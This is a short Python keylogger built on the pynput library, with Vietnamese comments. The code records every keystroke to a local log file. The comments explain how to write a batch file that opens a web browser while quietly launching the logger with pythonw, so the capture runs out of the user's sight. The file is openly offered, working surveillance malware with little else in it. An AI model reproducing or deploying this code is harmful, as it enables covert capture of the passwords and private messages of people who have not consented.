from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.tab":
        key = "\n"
    with open("log.txt", "a") as file:
        file.write(key)

with Listener(on_press=anonymous) as hacker:
    hacker.join()
# Tạo file theo cấu trúc: <tên file> .Bat
# trong file .bat tạo theo cấu trúc sau:
#     start "" "<đường dẫn trình duyệt website"
#     start (pythonw KeyLogger .pyw) an toàn hơn nên dùng đường dẫn tệp
#     * Yêu cầu cùng 1 ổ đĩa ms có thể chạy dc file .bat
